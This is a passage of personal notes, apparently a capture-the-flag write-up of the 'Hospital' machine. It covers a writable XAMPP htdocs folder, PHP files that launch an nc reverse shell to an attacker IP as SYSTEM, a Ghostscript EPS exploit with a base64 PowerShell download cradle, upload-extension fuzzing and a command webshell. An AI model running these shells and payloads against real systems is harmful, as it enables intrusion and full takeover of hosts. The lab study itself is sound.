+htdocs NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F)
+       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+       BUILTIN\Administrators:(I)(OI)(CI)(F)
+       BUILTIN\Users:(I)(OI)(CI)(RX)
+       BUILTIN\Users:(I)(CI)(AD)
+       BUILTIN\Users:(I)(CI)(WD)
+       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+   #+end_src
+   so all =Users= have =Append= and =Write= permissions on the directory.
+   #+begin_src 
+   This misconfiguration could allow us to drop a PHP script into this
+   directory and execute it via a web browser, potentially leading to the
+   acquisition of a privileged shell as an Administrator
+   #+end_src
+** php script to run whoami
+   create a script in the =htdocs= directory and check via =curl=
+   #+begin_src bat
+   echo "<?php system('whoami'); ?>" > C:\xampp\htdocs\whoami.php
+   #+end_src
+   this gets created, so let's call it
+   #+begin_src bat
+   curl -k https://localhost/whoami.php
+
+"nt authority\system"
+   #+end_src
+   so, it's clear we can run arbitrary commands as =SYSTEM=
+   now, let's execute the earlier msfvenom shell (in the guide, they run an nc
+   executable they uploaded)
+   copy =shell.exe= to =htdocs=
+   #+begin_src bash
+   echo "<?php exec('C:\xampp\htdocs\shell.exe'); ?>" > C:\xampp\htdocs\shell.php
+   #+end_src
+   however, this did not work even after significant efforts; so let's follow
+   the solution and use =nc.exe=
+** php script to run nc
+   #+begin_src bat
+   Set-Content C:\xampp\htdocs\shell.php "<?php exec('C:\xampp\htdocs\nc64.exe 10.10.17.115 4445 -e cmd.exe'); ?>" > 
+   #+end_src
+   verify this worked with =Get-Content=; not sure if =echo= fucks up some
+   formatting but i found =Set-Content= to be more reliable.
+   now run the script with curl
+   #+begin_src bat
+   C:\Users\drbrown.HOSPITAL\Documents>curl -k https://localhost/shell.php  
+   #+end_src
+   NOTE: another thing is I was unable to run =curl= with =-k= on the =evil-winrm=
+   session; it had to be done from the meterpreter powershell
+** system shell on nc listener
+    #+begin_src bat
+    nc -lvnp 4445
+
+listening on [any] 4445 ...
+connect to [10.10.17.115] from (UNKNOWN) [10.129.229.189] 6108
+Microsoft Windows [Version 10.0.17763.4974]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs>whoami
+whoami
+nt authority\system
+    #+end_src
+* ippsec
+  we never bothered with it (because it's a windows box i guess)but it's an
+  interesting question which host is actually the responding to the
+  *10.129.229.189* ip - if it's the windows or the ubuntu one.
+** figure out which OS the host is actually running with TTL
+   #+begin_src 
+   ping <ip>
+   #+end_src
+   we see the =ttl= is *127*, meaning the host is windows (default TTL of 128, 127
+   because of the VPN server)
+** confirm the linux is hyper-v and not docker
+   #+begin_src bat
+   sudo tcpdump -i tun0 -v -n ip src <target_ip>
+   #+end_src
+   =-v=     : verbose to show TTL
+   =-n=     : hide dns
+   =ip src= : only show packets coming from <target_ip>;
+            if not, it would show connections going to the server as well.
+*** connect to target_ip
+    #+begin_src bat
+    nc -zv <target_ip> 22
+    #+end_src
+    then we see on the tcpdump logs that the =TTL= is 62: linux is 64 by
+    default, so here it's 2 hops - the VPN and the windows host - so it's
+    *hyper-V* and not *docker* because docker doesn't decrement the =TTL=
+** uploads directory
+   =uploads/= is a common path so just test that; and we get =Forbidden= so it's
+   probably the right path since we get =Not Found= for other nonexistent directories.
+   for the filename, just guess the uploaded filename; try other stuff in case
+   this doesn't work - like the =md5 hash= of the name
+** ffuf to fuzz php extensions
+   copy the request from burp; and add the =FUZZ= keyword
+   #+begin_src bat
+   ffuf -request upload.req -request-proto http -w /usr/share/seclists/extensions-most-common.fuzz.txt
+   #+end_src
+   start with a small wordlist; find using =wc= like so:
+   #+begin_src bat
+   wc -l /usr/share/seclists/extension*
+   #+end_src
+   however, make sure strings like =php4= exist
+   with that wordlist, hits a bunch of extensions that work; tries =phtm= with a
+   #+begin_src bash
+   <?php system("whoami"); ?>
+   #+end_src
+   however, it turns out that just gets displayed as html and is not evaluated
+   after sending the above code with the =phar= extension, nothing is printed -
+   meaning someting is blocking php code. so change it to
+   #+begin_src bash
+   <?php echo("whoami"); ?>
+   #+end_src
+   and we get code execution
+*** phpinfo                                                          :ATTACH:
+    :PROPERTIES:
+    :ID:       44279673-6a99-4f55-9b1d-c666cfdcba47
+    :END:
+    send =phpinfo()= as the payload
+    #+begin_src bash
+      <?php phpinfo(); ?>
+    #+end_src
+    and we see many functions are blocked:
+    [[attachment:2026-08-17_16-02.png]]
+** p0wny-shell
+   [[https://github.com/flozz/p0wny-shell][this]] is a php webshell that can get past this blocking by actively using
+   stuff that's not blocked
+** dfunc bypass
+   ippsec doesn't use =p0wny-shell=, instead uses something called =dfunc bypass=
+   which he's already used in the =UpDown= box; however, the [[https://github.com/teambi0s/dfunc-bypasser/blob/master/README.md][dfunc bypass]] thing
+   is in python2, so he just converts it to php instead.
+   uploading this, we find =popen= is available and this is something we can use to run commands ([[https://www.php.net/manual/en/function.popen.php][popen run command]].)
+** ghostscript eps exploit - windows reverse shell
+   always better to rely on a web cradle since we have more info about whether
+   or not code execution worked;
+   use the one-liner reverse shell from nishang:
+   #+begin_src bat
+   cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 ./shell.ps1
+   #+end_src
+   now create a one-liner to execute this:
+   #+begin_src bat
+   echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.17.115:8000/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
+   #+end_src
+   this results in a base64 encoded string that can be executed like so:
+   #+begin_src bat
+   powershell -enc <string>
+   #+end_src
+   so the entire payload for the exploit becomes:
+   #+begin_src bat
+   python CVE_2023_36664_exploit.py --generate --payload "powershell -enc <b64_string>" --filename shell --extension eps
+   #+end_src
+** privesc
+   #+begin_src 
+   "i always like to get code execution as the web user especially on windows
+    because maybe there will be =SeImpersonate= privilege present and we can
+    use one of the potatoes to get admin"
+   #+end_src
+*** first method - with XAMPP                                        :ATTACH:
+    :PROPERTIES:
+    :ID:       2f187aea-67a6-47a0-a2c7-22981539e436
+    :END:
+    when we create a =shell.php= file within powershell inside the =htdocs=
+    folder (which is the eq. of =/var/www/hmtl=) and access it with a browser on
+    #+begin_src 
+    https://hospital.htb/shell.php
+    #+end_src
+    we don't get code execution and instead it just prints the string;
+    interestingly, what's going on is that powershell =UTF-16= encodes the
+    string and web server is unable to find the magic string which would tell
+    it the file is a php file. (intercept the response in burp and look at hex)
+    [[attachment:2026-08-19_11-09.png]]
+**** encode shell to UTF8 in powershell
+     so, do the following to change the encoding
+     #+begin_src bat
+     echo '<?php system($_REQUEST["cmd"]); ?>' | Out-File -Encoding UTF8 shell.php
+     #+end_src
